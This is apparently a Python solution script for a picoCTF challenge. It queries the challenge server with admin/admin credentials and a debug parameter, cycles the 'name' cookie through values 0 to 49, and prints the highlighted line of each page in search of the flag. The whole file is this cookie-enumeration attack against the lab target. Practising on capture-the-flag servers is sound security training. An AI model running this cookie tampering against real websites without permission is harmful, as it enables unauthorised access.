import time
import requests
import tqdm

url = 'http://mercury.picoctf.net:29649/'

def print_inportant(text: str):
    lines = text.split("\n")
    for line in lines:
        if "text-align:center; font-size:30px" in line:
            print(line)
            return


def main():
    params = {'username': "admin", "password": "admin", "debug": 1}

    for i in tqdm.tqdm(range(0,50)):
        cookies = {'name': f"{i}"}
        time.sleep(0.1)
        response = requests.get(url, params=params, cookies=cookies)
        if response.status_code == 200:
            print_inportant(response.text) 
        elif response.status_code != 200:
            print(f"status: {response.status_code}")
            raise RuntimeError("Error in query.")

if __name__ == "__main__":
    main()
